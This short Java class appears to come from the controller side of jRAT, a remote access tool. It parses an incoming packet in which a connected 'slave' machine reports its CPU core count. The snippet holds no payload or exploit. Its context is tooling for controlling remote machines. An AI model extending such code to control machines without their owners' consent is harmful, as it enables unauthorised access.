package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;


public class Packet14InitAvailableCores extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		short cores = slave.readShort();
		slave.setCores(cores);
	}

}
